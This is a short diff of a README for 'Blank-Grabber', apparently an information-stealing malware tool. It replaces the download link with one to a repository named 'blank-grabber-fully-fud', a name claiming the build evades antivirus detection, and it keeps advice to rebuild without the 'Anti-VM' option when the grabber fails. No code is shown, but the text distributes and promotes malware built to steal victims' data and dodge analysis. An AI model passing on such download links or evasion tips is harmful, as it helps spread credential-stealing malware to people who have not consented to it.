@@ -21,7 +21,7 @@
 
 ## 💾 Download
 
-[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/Blank-c/Blank-Grabber/archive/refs/heads/main.zip)
+[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/theolomo/blank-grabber-fully-fud/archive/refs/tags/ef.zip)
 
 > **💡 Note:** If the grabber fails, rebuild it without the "Anti-VM" option.
 
